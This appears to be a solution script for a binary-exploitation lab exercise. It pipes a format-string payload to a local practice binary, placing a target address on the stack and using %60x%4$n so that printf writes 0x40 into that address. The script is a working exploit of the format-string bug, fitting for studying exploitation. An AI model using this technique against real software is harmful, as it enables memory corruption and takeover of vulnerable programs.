#!/usr/bin/env bash
# ex07 — Format-string %n write: set target (0x080496e4) == 0x40 (64)
# printf(buf) with no format string — user controls format.
# Put &target at buf[0..3] (slot 4), print 60 more chars, then %4$n writes
# the running count (4 + 60 = 64 = 0x40) into *target.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex07 — format-string %n write to target via printf(buf)"
echo "[*] target : 0x080496e4  goal : 0x40"
echo ""

python3 -c "
import sys, struct
sys.stdout.buffer.write(struct.pack('<I', 0x080496e4) + b'%60x%4\$n\n')
" | "$BIN"

echo ""
echo "[*] done."
